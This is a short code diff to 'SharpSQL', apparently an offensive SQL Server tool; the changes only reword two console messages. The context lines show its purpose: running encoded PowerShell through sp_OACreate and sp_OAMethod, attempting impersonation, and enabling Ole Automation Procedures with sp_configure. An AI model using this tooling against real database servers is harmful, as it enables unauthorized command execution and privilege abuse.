@@ -11,7 +11,7 @@ namespace SharpSQL.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'");
+            Console.WriteLine("[*] Action: Execute Arbitrary Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod':");
             Console.WriteLine("\tUsage: SharpSQL.exe ole /db:DATABASE /server:SERVER /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
             string database = "";
@@ -100,7 +100,7 @@ namespace SharpSQL.Commands
             SqlCommand command = new SqlCommand(execAs, connection);
             SqlDataReader reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine("[*] Attempting impersonation..");
+            Console.WriteLine("\n[*] Attempting impersonation..");
             reader.Close();
 
             string enableOle = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
